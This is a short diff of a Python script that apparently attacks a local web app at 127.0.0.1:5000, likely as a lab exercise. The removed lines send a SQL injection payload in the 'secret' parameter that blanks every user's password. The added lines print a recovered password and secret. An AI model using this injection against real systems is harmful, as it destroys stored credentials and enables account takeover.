@@ -16,13 +16,8 @@ for i in r_dictionary:
         password = v[0]
         break
 
-
-ploads = {'secret': secret + "'; UPDATE users SET password='' --",}
-r = requests.get('http://127.0.0.1:5000/users',params=ploads)
-
-ploads = {'secret': secret}
-r = requests.get('http://127.0.0.1:5000/users',params=ploads)
-print(r.text)
+print("Password: {}".format(password))
+print("Secret: {}".format(secret))
 
 
 
